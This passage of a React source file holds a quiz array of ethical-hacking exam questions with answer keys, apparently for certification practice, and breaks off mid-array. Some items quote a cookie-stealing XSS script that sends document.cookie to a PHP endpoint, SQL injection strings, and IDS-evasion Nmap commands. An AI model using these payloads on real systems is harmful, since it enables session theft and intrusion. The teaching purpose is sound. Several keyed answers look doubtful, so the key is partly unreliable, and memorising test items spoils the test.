import React, { useState } from 'react';
import { ChevronLeft, ChevronRight, Eye, EyeOff } from 'lucide-react';

interface Question {
  question: string;
  options: string[];
  correctAnswer: string;
}

const questions: Question[] = [
  {
    question:
      'Which is the first step followed by Vulnerability Scanners for scanning a network?',
    options: [
      'Firewall detection',
      'TCP/UDP Port scanning',
      'Checking if the remote host is alive',
      'OS Detection',
    ],
    correctAnswer: 'Checking if the remote host is alive',
  },
  {
    question:
      'You are attempting to run an Nmap port scan on a web server. Which of the following commands would result in a scan of common ports with the least amount of noise in order to evade IDS?',
    options: [
      'nmap -A - Pn',
      'nmap -sP -p-65535 -T5',
      'nmap -sT -O -T0',
      'nmap -A --host-timeout 99 -T1',
    ],
    correctAnswer: 'nmap -sT -O -T0',
  },
  {
    question:
      'A bank stores and processes sensitive privacy information related to home loans. However, auditing has never been enabled on the system. What is the first step that the bank should take before enabling the audit feature?',
    options: [
      'Perform a vulnerability scan of the system.',
      'Determine the impact of enabling the audit feature.',
      'Perform a cost/benefit analysis of the audit feature.',
      'Allocate funds for staffing of audit log review.',
    ],
    correctAnswer: 'Determine the impact of enabling the audit feature.',
  },
  {
    question:
      'Your company was hired by a small healthcare provider to perform a technical assessment on the network. What is the best approach for discovering vulnerabilities on a Windows-based computer?',
    options: [
      'Use the built-in Windows Update tool',
      'Use a scan tool like Nessus',
      'Check MITRE.org for the latest list of CVE findings',
      'Create a disk image of a clean Windows installation',
    ],
    correctAnswer: 'Use a scan tool like Nessus',
  },
  {
    question:
      'Wilson, a professional hacker, targets an organization for financial benefit and plans to compromise its systems by sending malicious emails. For this purpose, he uses a tool to track the emails of the target and extracts information such as sender identities, mail servers, sender IP addresses, and sender locations from different public sources. He also checks if an email address was leaked using the haveibeenpwned.com API. Which of the following tools is used by Wilson in the above scenario?',
    options: ['Factiva', 'ZoomInfo', 'Netcraft', 'Infoga'],
    correctAnswer: 'Infoga',
  },
  {
    question:
      'Bob, an attacker, has managed to access a target IoT device. He employed an online tool to gather information related to the model of the IoT device and the certifications granted to it. Which of the following tools did Bob employ to gather the above information?',
    options: [
      'FCC ID search',
      'Google image search',
      'search.com',
      'EarthExplorer',
    ],
    correctAnswer: 'FCC ID search',
  },
  {
    question:
      "A penetration tester is performing the footprinting process and is reviewing publicly available information about an organization by using the Google search engine. Which of the following advanced operators would allow the pen tester to restrict the search to the organization's web domain?",
    options: ['[allinurl:]', '[location:]', '[site:]', '[link:]'],
    correctAnswer: '[site:]',
  },
  {
    question:
      'Annie, a cloud security engineer, uses the Docker architecture to employ a client/server model in the application she is working on. She utilizes a component that can process API requests and handle various Docker objects, such as containers, volumes, images, and networks. What is the component of the Docker architecture used by Annie in the above scenario?',
    options: [
      'Docker objects',
      'Docker daemon',
      'Docker client',
      'Docker registries',
    ],
    correctAnswer: 'Docker daemon',
  },
  {
    question:
      "You are a penetration tester working to test the user awareness of the employees of the client XYZ. You harvested two employees' emails from some public sources and are creating a client-side backdoor to send it to the employees via email. Which stage of the cyber kill chain are you at?",
    options: [
      'Reconnaissance',
      'Weaponization',
      'Command and control',
      'Exploitation',
    ],
    correctAnswer: 'Weaponization',
  },
  {
    question:
      "SQL injection (SQLi) attacks attempt to inject SQL syntax into web requests, which may bypass authentication and allow attackers to access and/or modify data attached to a web application. Which of the following SQLi types leverages a database server's ability to make DNS requests to pass data to an attacker?",
    options: [
      'In-band SQLi',
      'Union-based SQLi',
      'Out-of-band SQLi',
      'Time-based blind SQLi',
    ],
    correctAnswer: 'Out-of-band SQLi',
  },
  {
    question:
      'What is the port to block first in case you are suspicious that an IoT device has been compromised?',
    options: ['22', '48101', '80', '443'],
    correctAnswer: '48101',
  },
  {
    question:
      'Samuel, a security administrator, is assessing the configuration of a web server. He noticed that the server permits SSLv2 connections, and the same private key certificate is used on a different server that allows SSLv2 connections. This vulnerability makes the web server vulnerable to attacks as the SSLv2 server can leak key information. Which of the following attacks can be performed by exploiting the above vulnerability?',
    options: [
      'Padding oracle attack',
      'DROWN attack',
      'DUHK attack',
      'Side-channel attack',
    ],
    correctAnswer: 'DROWN attack',
  },
  {
    question:
      'Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. John decided to perform a TCP SYN ping scan on the target network. Which of the following Nmap commands must John use to perform the TCP SYN ping scan?',
    options: [
      'nmap -sn -PO <target IP address>',
      'nmap -sn -PS <target IP address>',
      'nmap -sn -PA <target IP address>',
      'nmap -sn -PP <target IP address>',
    ],
    correctAnswer: 'nmap -sn -PS <target IP address>',
  },
  {
    question:
      "Alice, a professional hacker, targeted an organization's cloud services. She infiltrated the target's MSP provider by sending spear-phishing emails and distributed custom-made malware to compromise user accounts and gain remote access to the cloud service. Further, she accessed the target customer profiles with her MSP account, compressed the customer data, and stored them in the MSP. Then, she used this information to launch further attacks on the target organization. Which of the following cloud attacks did Alice perform in the above scenario?",
    options: [
      'Cloud cryptojacking',
      'Man-in-the-cloud (MITC) attack',
      'Cloud hopper attack',
      'Cloudborne attack',
    ],
    correctAnswer: 'Cloud hopper attack',
  },
  {
    question:
      'John, a professional hacker, targeted an organization that uses LDAP for accessing distributed directory services. He used an automated tool to anonymously query the LDAP service for sensitive information such as usernames, addresses, departmental details, and server names to launch further attacks on the target organization. What is the tool employed by John to gather information from the LDAP service?',
    options: ['ike-scan', 'Zabasearch', 'JXplorer', 'EarthExplorer'],
    correctAnswer: 'JXplorer',
  },
  {
    question:
      "Johnson, an attacker, performed online research for the contact details of reputed cybersecurity firms. He found the contact number of sibertech.org and dialed the number, claiming himself to represent a technical support team from a vendor. He warned that a specific server is about to be compromised and requested sibertech.org to follow the provided instructions. Consequently, he prompted the victim to execute unusual commands and install malicious files, which were then used to collect and pass critical information to Johnson's machine. What is the social engineering technique Steve employed in the above scenario?",
    options: ['Diversion theft', 'Quid pro quo', 'Elicitation', 'Phishing'],
    correctAnswer: 'Quid pro quo',
  },
  {
    question:
      "Jane invites her friends Alice and John over for a LAN party. Alice and John access Jane's wireless network without a password. However, Jane has a long, complex password on her router. What attack has likely occurred?",
    options: ['Wardriving', 'Wireless sniffing', 'Evil twin', 'Piggybacking'],
    correctAnswer: 'Piggybacking',
  },
  {
    question:
      'To create a botnet, the attacker can use several techniques to scan vulnerable machines. The attacker first collects information about a large number of vulnerable machines to create a list. Subsequently, they infect the machines. The list is divided by assigning half of the list to the newly compromised machines. The scanning process runs simultaneously. This technique ensures the spreading and installation of malicious code in little time. Which technique is discussed here?',
    options: [
      'Subnet scanning technique',
      'Permutation scanning technique',
      'Hit-list scanning technique',
      'Topological scanning technique',
    ],
    correctAnswer: 'Hit-list scanning technique',
  },
  {
    question:
      "An organization is performing a vulnerability assessment for mitigating threats. James, a pen tester, scanned the organization by building an inventory of the protocols found on the organization's machines to detect which ports are attached to services such as an email server, a web server, or a database server. After identifying the services, he selected the vulnerabilities on each machine and started executing only the relevant tests. What is the type of vulnerability assessment solution that James employed in the above scenario?",
    options: [
      'Service-based solutions',
      'Product-based solutions',
      'Tree-based assessment',
      'Inference-based assessment',
    ],
    correctAnswer: 'Service-based solutions',
  },
  {
    question:
      'At what stage of the cyber kill chain theory model does data exfiltration occur?',
    options: [
      'Weaponization',
      'Actions on objectives',
      'Command and control',
      'Installation',
    ],
    correctAnswer: 'Actions on objectives',
  },
  {
    question:
      "Heather's company has decided to use a new customer relationship management tool. After performing the appropriate research, they decided to purchase a subscription to a cloud-hosted solution. The only administrative task that Heather will need to perform is the management of user accounts. The provider will take care of the hardware, operating system, and software administration including patching and monitoring. Which of the following is this type of solution?",
    options: ['IaaS', 'SaaS', 'PaaS', 'CaaS'],
    correctAnswer: 'SaaS',
  },
  {
    question:
      'By performing a penetration test, you gained access under a user account. During the test, you established a connection with your own machine via the SMB service and occasionally entered your login and password in plaintext. Which file do you have to clean to clear the password?',
    options: ['.xsession-log', '.profile', '.bashrc', '.bash_history'],
    correctAnswer: '.bash_history',
  },
  {
    question:
      'Infecting a system with malware and using phishing to gain credentials to a system or web application are examples of which phase of the ethical hacking methodology?',
    options: [
      'Scanning',
      'Gaining access',
      'Maintaining access',
      'Reconnaissance',
    ],
    correctAnswer: 'Gaining access',
  },
  {
    question:
      "John is investigating web-application firewall logs and observes that someone is attempting to inject the following: char buff[10]; buff[10] = `˜a'; What type of attack is this?",
    options: ['SQL injection', 'Buffer overflow', 'CSRF', 'XSS'],
    correctAnswer: 'Buffer overflow',
  },
  {
    question:
      'What is the common name for a vulnerability disclosure program opened by companies in platforms such as HackerOne?',
    options: [
      'White-hat hacking program',
      'Bug bounty program',
      'Ethical hacking program',
      'Vulnerability hunting program',
    ],
    correctAnswer: 'Bug bounty program',
  },
  {
    question:
      "There are multiple cloud deployment options depending on how isolated a customer's resources are from those of other customers. Shared environments share the costs and allow each customer to enjoy lower operations expenses. One solution is for a customer to join with a group of users or organizations to share a cloud environment. What is this cloud deployment option called?",
    options: ['Private', 'Community', 'Public', 'Hybrid'],
    correctAnswer: 'Community',
  },
  {
    question:
      'Andrew is an Ethical Hacker who was assigned the task of discovering all the active devices hidden by a restrictive firewall in the IPv4 range in a given target network. Which of the following host discovery techniques must he use to perform the given task?',
    options: [
      'UDP scan',
      'ARP ping scan',
      'ACK flag probe scan',
      'TCP Maimon scan',
    ],
    correctAnswer: 'ACK flag probe scan',
  },
  {
    question:
      'An organization has automated the operation of critical infrastructure from a remote location. For this purpose, all the industrial control systems are connected to the Internet. To empower the manufacturing process, ensure the reliability of industrial networks, and reduce downtime and service disruption, the organization decided to install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. Which of the following tools must the organization employ to protect its critical infrastructure?',
    options: ['Robotium', 'BalenaCloud', 'Flowmon', 'IntentFuzzer'],
    correctAnswer: 'Flowmon',
  },
  {
    question:
      'Bella, a security professional working at an IT firm, finds that a security breach has occurred while transferring important files. Sensitive data, employee usernames, and passwords are shared in plaintext, paving the way for hackers to perform successful session hijacking. To address this situation, Bella implemented a protocol that sends data using encryption and digital certificates. Which of the following protocols is used by Bella?',
    options: ['FTPS', 'FTP', 'HTTPS', 'IP'],
    correctAnswer: 'HTTPS',
  },
  {
    question:
      "Security administrator John Smith has noticed abnormal amounts of traffic coming from local computers at night. Upon reviewing, he finds that user data have been exfiltrated by an attacker. AV tools are unable to find any malicious software, and the IDS/IPS has not reported on any non-whitelisted programs. What type of malware did the attacker use to bypass the company's application whitelisting?",
    options: [
      'File-less malware',
      'Zero-day malware',
      'Phishing malware',
      'Logic bomb malware',
    ],
    correctAnswer: 'File-less malware',
  },
  {
    question:
      "Kevin, a professional hacker, wants to penetrate CyberTech Inc's network. He employed a technique, using which he encoded packets with Unicode characters. The company's IDS cannot recognize the packets, but the target web server can decode them. What is the technique used by Kevin to evade the IDS system?",
    options: [
      'Session splicing',
      'Urgency flag',
      'Obfuscating',
      'Desynchronization',
    ],
    correctAnswer: 'Obfuscating',
  },
  {
    question:
      "Jim, a professional hacker, targeted an organization that is operating critical industrial infrastructure. Jim used Nmap to scan open ports and running services on systems connected to the organization's OT network. He used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered information such as the vendor name, product code and name, device name, and IP address. Which of the following Nmap commands helped Jim retrieve the required information?",
    options: [
      'nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >',
      'nmap -Pn -sU -p 44818 --script enip-info < Target IP >',
      'nmap -Pn -sT -p 46824 < Target IP >',
      'nmap -Pn -sT -p 102 --script s7-info < Target IP >',
    ],
    correctAnswer: 'nmap -Pn -sU -p 44818 --script enip-info < Target IP >',
  },
  {
    question:
      'In this form of encryption algorithm, every individual block contains 64-bit data, and three keys are used, where each key consists of 56 bits. Which is this encryption algorithm?',
    options: [
      'IDEA',
      'Triple Data Encryption Standard',
      'AES',
      'MD5 encryption algorithm',
    ],
    correctAnswer: 'Triple Data Encryption Standard',
  },
  {
    question:
      'Sam is a penetration tester hired by Inception Tech, a security organization. He was asked to perform port scanning on a target host in the network. While performing the given task, Sam sends FIN/ACK probes and determines that an RST packet is sent in response by the target host, indicating that the port is closed. What is the port scanning technique used by Sam to discover open ports?',
    options: [
      'Xmas scan',
      'IDLE/IPID header scan',
      'TCP Maimon scan',
      'ACK flag probe scan',
    ],
    correctAnswer: 'ACK flag probe scan',
  },
  {
    question:
      'Gerard, a disgruntled ex-employee of Sunglass IT Solutions, targets this organization to perform sophisticated attacks and bring down its reputation in the market. To launch the attacks process, he performed DNS footprinting to gather information about DNS servers and to identify the hosts connected in the target network. He used an automated tool that can retrieve information about DNS zone data including DNS domain names, computer names, IP addresses, DNS records, and network Whois records. He further exploited this information to launch other sophisticated attacks. What is the tool employed by Gerard in the above scenario?',
    options: ['Towelroot', 'Knative', 'zANTI', 'Bluto'],
    correctAnswer: 'Bluto',
  },
  {
    question:
      'John, a professional hacker, decided to use DNS to perform data exfiltration on a target network. In this process, he embedded malicious data into the DNS protocol packets that even DNSSEC cannot detect. Using this technique, John successfully injected malware to bypass a firewall and maintained communication with the victim machine and C&C server. What is the technique employed by John to bypass the firewall?',
    options: [
      'DNSSEC zone walking',
      'DNS cache snooping',
      'DNS enumeration',
      'DNS tunneling method',
    ],
    correctAnswer: 'DNS tunneling method',
  },
  {
    question:
      'Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of applications, he follows the five-tier container technology architecture. Currently, Abel is verifying and validating image contents, signing images, and sending them to the registries. Which of the following tiers of the container technology architecture is Abel currently working in?',
    options: [
      'Tier-1: Developer machines',
      'Tier-2: Testing and accreditation systems',
      'Tier-3: Registries',
      'Tier-4: Orchestrators',
    ],
    correctAnswer: 'Tier-2: Testing and accreditation systems',
  },
  {
    question:
      "Taylor, a security professional, uses a tool to monitor her company's website, analyze the website's traffic, and track the geographical location of the users visiting the company's website. Which of the following tools did Taylor employ in the above scenario?",
    options: ['Webroot', 'Web-Stat', 'WebSite-Watcher', 'WAFW00F'],
    correctAnswer: 'Web-Stat',
  },
  {
    question:
      "Attacker Rony installed a rogue access point within an organization's perimeter and attempted to intrude into its internal network. Johnson, a security auditor, identified some unusual traffic in the internal network that is aimed at cracking the authentication mechanism. He immediately turned off the targeted network and tested for any weak and outdated security mechanisms that are open to attack. What is the type of vulnerability assessment performed by Johnson in the above scenario?",
    options: [
      'Wireless network assessment',
      'Application assessment',
      'Host-based assessment',
      'Distributed assessment',
    ],
    correctAnswer: 'Wireless network assessment',
  },
  {
    question:
      'Joe works as an IT administrator in an organization and has recently set up a cloud computing service for the organization. To implement this service, he reached out to a telecom company for providing Internet connectivity and transport services between the organization and the cloud service provider. In the NIST cloud deployment reference architecture, under which category does the telecom company fall in the above scenario?',
    options: [
      'Cloud consumer',
      'Cloud broker',
      'Cloud auditor',
      'Cloud carrier',
    ],
    correctAnswer: 'Cloud carrier',
  },
  {
    question:
      'A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the Equifax data breach that affected 143 million customers. A fix was available from the software vendor for several months prior to the intrusion. This is likely a failure in which of the following security processes?',
    options: [
      'Secure development lifecycle',
      'Security awareness training',
      'Vendor risk management',
      'Patch management',
    ],
    correctAnswer: 'Patch management',
  },
  {
    question:
      'Don, a student, came across a gaming app in a third-party app store and installed it. Subsequently, all the legitimate apps in his smartphone were replaced by deceptive applications that appeared legitimate. He also received many advertisements on his smartphone after installing the app. What is the attack performed on Don in the above scenario?',
    options: [
      'SIM card attack',
      'Clickjacking',
      'SMS phishing attack',
      'Agent Smith attack',
    ],
    correctAnswer: 'Agent Smith attack',
  },
  {
    question:
      'This form of encryption algorithm is a symmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?',
    options: [
      'HMAC encryption algorithm',
      'Twofish encryption algorithm',
      'IDEA',
      'Blowfish encryption algorithm',
    ],
    correctAnswer: 'Twofish encryption algorithm',
  },
  {
    question:
      'Ethical hacker Jane Smith is attempting to perform an SQL injection attack. She wants to test the response time of a true or false response and wants to use a second command to determine whether the database will return true or false results for user IDs. Which two SQL injection types would give her the results she is looking for?',
    options: [
      'Out of band and boolean-based',
      'Union-based and error-based',
      'Time-based and union-based',
      'Time-based and boolean-based',
    ],
    correctAnswer: 'Time-based and boolean-based',
  },
  {
    question:
      "Judy created a forum. One day, she discovers that a user is posting strange images without writing comments. She immediately calls a security expert, who discovers that the following code is hidden behind those images: <script> document.write(`˜<img.src=`https://localhost/submitcookie.php? cookie ='+ escape(document.cookie) +`' />); </script> What issue occurred for the users who clicked on the image?",
    options: [
      "This php file silently executes the code and grabs the user's session cookie and session ID.",
      'The code redirects the user to another site.',
      'The code injects a new cookie to the browser.',
      "The code is a virus that is attempting to gather the user's username and password.",
    ],
    correctAnswer:
      "This php file silently executes the code and grabs the user's session cookie and session ID.",
  },
  {
    question:
      "Suppose that you test an application for the SQL injection vulnerability. You know that the backend database is based on Microsoft SQL Server. In the login/ password form, you enter the following credentials: Username: attack' or 1=1 ` Password: 123456 - Based on the above credentials, which of the following SQL commands are you expecting to be executed by the server, if there is indeed an SQL injection vulnerability?",
    options: [
      "select * from Users where UserName = 'attack' ' or 1=1 -- and UserPassword = '123456'",
      "select * from Users where UserName = 'attack' or 1=1 -- and UserPassword = '123456'",
      "select * from Users where UserName = 'attack or 1=1 -- and UserPassword = '123456'",
      "select * from Users where UserName = 'attack' or 1=1 --' and UserPassword = '123456'",
    ],
    correctAnswer:
      "select * from Users where UserName = 'attack' or 1=1 --' and UserPassword = '123456'",
  },
  {
    question:
      'A DDoS attack is performed at layer 7 to take down web infrastructure. Partial HTTP requests are sent to the web infrastructure or applications. Upon receiving a partial request, the target servers opens multiple connections and keeps waiting for the requests to complete. Which attack is being described here?',
    options: [
      'Desynchronization',
      'Slowloris attack',
      'Session splicing',
      'Phlashing',
    ],
    correctAnswer: 'Slowloris attack',
  },
  {
    question:
      "Boney, a professional hacker, targets an organization for financial benefits. He performs an attack by sending his session ID using an MITM attack technique. Boney first obtains a valid session ID by logging into a service and later feeds the same session ID to the target employee. The session ID links the target employee to Boney's account page without disclosing any information to the victim. When the target employee clicks on the link, all the sensitive payment details entered in a form are linked to Boney's account. What is the attack performed by Boney in the above scenario?",
    options: [
      'Forbidden attack',
      'CRIME attack',
      'Session donation attack',
      'Session fixation attack',
    ],
    correctAnswer: 'Session fixation attack',
  },
  {
    question:
      'Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application. What is the type of web-service API mentioned in the above scenario?',
    options: ['RESTful API', 'JSON-RPC', 'SOAP API', 'REST API'],
    correctAnswer: 'RESTful API',
  },
  {
    question:
      "Daniel is a professional hacker who is attempting to perform an SQL injection attack on a target website, www.moviescope.com. During this process, he encountered an IDS that detects SQL injection attempts based on predefined signatures. To evade any comparison statement, he attempted placing characters such as `'or `˜1'=`˜1'` in any basic injection statement such as `or 1=1.` Identify the evasion technique used by Daniel in the above scenario.",
    options: ['Char encoding', 'IP fragmentation', 'Variation', 'Null byte'],
    correctAnswer: 'Char encoding',
  },
  {
    question:
      "Jane, an ethical hacker, is testing a target organization's web server and website to identify security loopholes. In this process, she copied the entire website and its content on a local drive to view the complete profile of the site's directory structure, file structure, external links, images, web pages, and so on. This information helps Jane map the website's directories and gain valuable information. What is the attack technique employed by Jane in the above scenario?",
    options: [
      'Session hijacking',
      'Website mirroring',
      'Website defacement',
      'Web cache poisoning',
    ],
    correctAnswer: 'Website mirroring',
  },
  {
    question:
      "Steve, an attacker, created a fake profile on a social media website and sent a request to Stella. Stella was enthralled by Steve's profile picture and the description given for his profile, and she initiated a conversation with him soon after accepting the request. After a few days, Steve started asking about her company details and eventually gathered all the essential information regarding her company. What is the social engineering technique Steve employed in the above scenario?",
    options: ['Baiting', 'Piggybacking', 'Diversion theft', 'Honey trap'],
    correctAnswer: 'Honey trap',
  },
  {
    question:
      'Harry, a professional hacker, targets the IT infrastructure of an organization. After preparing for the attack, he attempts to enter the target network using techniques such as sending spear-phishing emails and exploiting vulnerabilities on publicly available servers. Using these techniques, he successfully deployed malware on the target system to establish an outbound connection. What is the APT lifecycle phase that Harry is currently executing?',
    options: ['Initial intrusion', 'Persistence', 'Cleanup', 'Preparation'],
    correctAnswer: 'Initial intrusion',
  },
  {
    question:
      "While browsing his Facebook feed, Matt sees a picture one of his friends posted with the caption, `Learn more about your friends!`, as well as a number of personal questions. Matt is suspicious and texts his friend, who confirms that he did indeed post it. With assurance that the post is legitimate, Matt responds to the questions on the post. A few days later, Matt's bank account has been accessed, and the password has been changed. What most likely happened?",
    options: [
      'Matt inadvertently provided the answers to his security questions when responding to the post.',
      'Matt inadvertently provided his password when responding to the post.',
      "Matt's computer was infected with a keylogger.",
      "Matt's bank-account login information was brute forced.",
    ],
    correctAnswer:
      'Matt inadvertently provided the answers to his security questions when responding to the post.',
  },
  {
    question:
      'What is the file that determines the basic configuration (specifically activities, services, broadcast receivers, etc.) in an Android application?',
    options: [
      'AndroidManifest.xml',
      'classes.dex',
      'APK.info',
      'resources.asrc',
    ],
    correctAnswer: 'AndroidManifest.xml',
  },
  {
    question:
      'Clark, a professional hacker, was hired by an organization to gather sensitive information about its competitors surreptitiously. Clark gathers the server IP address of the target organization using Whois footprinting. Further, he entered the server IP address as an input to an online tool to retrieve information such as the network range of the target organization and to identify the network topology and operating system used in the network. What is the online tool employed by Clark in the above scenario?',
    options: ['DuckDuckGo', 'AOL', 'ARIN', 'Baidu'],
    correctAnswer: 'ARIN',
  },
  {
    question:
      'This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to protect sensitive data, such as GCMP-256, HMAC-SHA384, and ECDSA using a 384-bit elliptic curve. Which is this wireless security protocol?',
    options: [
      'WPA3-Personal',
      'WPA3-Enterprise',
      'WPA2-Enterprise',
      'WPA2-Personal',
    ],
    correctAnswer: 'WPA3-Enterprise',
  },
  {
    question:
      'Scenario: Joe turns on his home computer to access personal online banking. When he enters the URL www.bank.com, the website is displayed, but it prompts him to re-enter his credentials as if he has never visited the site before. When he examines the website URL closer, he finds that the site is not secure and the web address appears different. What type of attack he is experiencing?',
    options: [
      'DHCP spoofing',
      'DoS attack',
      'ARP cache poisoning',
      'DNS hijacking',
    ],
    correctAnswer: 'DNS hijacking',
  },
  {
    question:
      'Henry is a cyber security specialist hired by BlackEye Cyber Security Solutions. He was tasked with discovering the operating system (OS) of a host. He used the Unicornscan tool to discover the OS of the target system. As a result, he obtained a TTL value, which indicates that the target system is running a Windows OS. Identify the TTL value Henry obtained, which indicates that the target OS is Windows.',
    options: ['128', '255', '64', '138'],
    correctAnswer: '128',
  },
  {
    question:
      'What are common files on a web server that can be misconfigured and provide useful information for a hacker such as verbose error messages?',
    options: ['httpd.conf', 'administration.config', 'php.ini', 'idq.dll'],
    correctAnswer: 'httpd.conf',
  },
  {
    question:
      "Abel, a security professional, conducts penetration testing in his client organization to check for any security loopholes. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. This led to a DoS attack, and as a result, legitimate employees were unable to access the client's network. Which of the following attacks did Abel perform in the above scenario?",
    options: [
      'Rogue DHCP server attack',
      'VLAN hopping',
      'STP attack',
      'DHCP starvation',
    ],
    correctAnswer: 'DHCP starvation',
  },
  {
    question:
      "What piece of hardware on a computer's motherboard generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is not possible?",
    options: ['CPU', 'UEFI', 'GPU', 'TPM'],
    correctAnswer: 'TPM',
  },
  {
    question:
      'Garry is a network administrator in an organization. He uses SNMP to manage networked devices from a remote location. To manage nodes in the network, he uses MIB, which contains formal descriptions of all network objects managed by SNMP. He accesses the contents of MIB by using a web browser either by entering the IP address and Lseries.mib or by entering the DNS library name and Lseries.mib. He is currently retrieving information from an MIB that contains object types for workstations and server services. Which of the following types of MIB is accessed by Garry in the above scenario?',
    options: ['LNMIB2.MIB', 'DHCP.MIB', 'MIB_II.MIB', 'WINS.MIB'],
    correctAnswer: 'MIB_II.MIB',
  },
  {
    question:
      'Which of the following Bluetooth hacking techniques refers to the theft of information from a wireless device through Bluetooth?',
    options: ['Bluesmacking', 'Bluesnarfing', 'Bluejacking', 'Bluebugging'],
    correctAnswer: 'Bluesnarfing',
  },
  {
    question:
      "When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator's Computer to update the router configuration. What type of an alert is this?",
    options: [
      'False negative',
      'True negative',
      'True positive',
      'False positive',
    ],
    correctAnswer: 'False positive',
  },
  {
    question:
      'David is a security professional working in an organization, and he is implementing a vulnerability management program in the organization to evaluate and control the risks and vulnerabilities in its IT infrastructure. He is currently executing the process of applying fixes on vulnerable systems to reduce the impact and severity of vulnerabilities. Which phase of the vulnerability-management life cycle is David currently in?',
    options: [
      'Remediation',
      'Verification',
      'Risk assessment',
      'Vulnerability scan',
    ],
    correctAnswer: 'Remediation',
  },
  {
    question:
      "Bobby, an attacker, targeted a user and decided to hijack and intercept all their wireless communications. He installed a fake communication tower between two authentic endpoints to mislead the victim. Bobby used this virtual tower to interrupt the data transmission between the user and real tower, attempting to hijack an active session. Upon receiving the user's request, Bobby manipulated the traffic with the virtual tower and redirected the victim to a malicious website. What is the attack performed by Bobby in the above scenario?",
    options: [
      'aLTEr attack',
      'Jamming signal attack',
      'Wardriving',
      'KRACK attack',
    ],
    correctAnswer: 'aLTEr attack',
  },
  {
    question:
      "Attacker Lauren has gained the credentials of an organization's internal server system, and she was often logging in during irregular times to monitor the network activities. The organization was skeptical about the login times and appointed security professional Robert to determine the issue. Robert analyzed the compromised device to find incident details such as the type of attack, its severity, target, impact, method of propagation, and vulnerabilities exploited. What is the incident handling and response (IH&R) phase, in which Robert has determined these issues?",
    options: [
      'Incident triage',
      'Preparation',
      'Incident recording and assignment',
      'Eradication',
    ],
    correctAnswer: 'Incident triage',
  },
  {
    question:
      "Bill is a network administrator. He wants to eliminate unencrypted traffic inside his company's network. He decides to setup a SPAN port and capture all traffic to the datacenter. He immediately discovers unencrypted traffic in port UDP 161. What protocol is this port using and how can he secure that traffic?",
    options: [
      'RPC and the best practice is to disable RPC completely.',
      'SNMP and he should change it to SNMP V3.',
      'SNMP and he should change it to SNMP V2, which is encrypted.',
      'It is not necessary to perform any actions, as SNMP is not carrying important information.',
    ],
    correctAnswer: 'SNMP and he should change it to SNMP V3.',
  },
  {
    question:
      'Emily, an extrovert obsessed with social media, posts a large amount of private information, photographs, and location tags of recently visited places. Realizing this, James, a professional hacker, targets Emily and her acquaintances, conducts a location search to detect their geolocation by using an automated tool, and gathers information to perform other sophisticated attacks. What is the tool employed by James in the above scenario?',
    options: ['ophcrack', 'VisualRoute', 'Hootsuite', 'HULK'],
    correctAnswer: 'VisualRoute',
  },
  {
    question:
      'Clark is a professional hacker. He created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection. Identify the behavior of the adversary in the above scenario.',
    options: [
      'Unspecified proxy activities',
      'Use of command-line interface',
      'Data staging',
      'Use of DNS tunneling',
    ],
    correctAnswer: 'Use of DNS tunneling',
  },
  {
    question:
      "Ricardo has discovered the username for an application in his target's environment. As he has a limited amount of time, he decides to attempt to use a list of common passwords he found on the Internet. He compiles them into a list and then feeds that list as an argument into his password-cracking application. What type of attack is Ricardo performing?",
    options: [
      'Brute force',
      'Known plaintext',
      'Dictionary',
      'Password spraying',
    ],
    correctAnswer: 'Dictionary',
  },
  {
    question:
      "Attacker Steve targeted an organization's network with the aim of redirecting the company's web traffic to another malicious website. To achieve this goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and modified the original IP address of the target website to that of a fake website. What is the technique employed by Steve to gather information for identity theft?",
    options: ['Pharming', 'Skimming', 'Pretexting', 'Wardriving'],
    correctAnswer: 'Pharming',
  },
  {
    question:
      'Nicolas just found a vulnerability on a public-facing system that is considered a zero-day vulnerability. He sent an email to the owner of the public system describing the problem and how the owner can protect themselves from that vulnerability. He also sent an email to Microsoft informing them of the problem that their systems are exposed to. What type of hacker is Nicolas?',
    options: ['Black hat', 'White hat', 'Gray hat', 'Red hat'],
    correctAnswer: 'Gray hat',
  },
  {
    question:
      'Jason, an attacker, targeted an organization to perform an attack on its Internet-facing web server with the intention of gaining access to backend servers, which are protected by a firewall. In this process, he used a URL https://xyz.com/feed.php?url=externalsite.com/feed/to to obtain a remote feed and altered the URL input to the local host to view all the local resources on the target server. What is the type of attack Jason performed in the above scenario?',
    options: [
      'Web server misconfiguration',
      'Server-side request forgery (SSRF) attack',
      'Web cache poisoning attack',
      'Website defacement',
    ],
    correctAnswer: 'Server-side request forgery (SSRF) attack',
  },
  {
    question:
      'You are a penetration tester tasked with testing the wireless network of your client Brakeme SA. You are attempting to break into the wireless network with the SSID `Brakeme-Internal.` You realize that this network uses WPA3 encryption. Which of the following vulnerabilities is the promising to exploit?',
    options: [
      'Cross-site request forgery',
      'Dragonblood',
      'Key reinstallation attack',
      'AP misconfiguration',
    ],
    correctAnswer: 'Dragonblood',
  },
  {
    question:
      'While testing a web application in development, you notice that the web server does not properly ignore the `dot dot slash` (../) character string and instead returns the file listing of a folder higher up in the folder structure of the server. What kind of attack is possible in this scenario?',
    options: [
      'Cross-site scripting',
      'SQL injection',
      'Denial of service',
      'Directory traversal',
    ],
    correctAnswer: 'Directory traversal',
  },
  {
    question:
      'John, a professional hacker, performs a network attack on a renowned organization and gains unauthorized access to the target network. He remains in the network without being detected for a long time and obtains sensitive information without sabotaging the organization. Which of the following attack techniques is used by John?',
    options: [
      'Insider threat',
      'Diversion theft',
      'Spear-phishing sites',
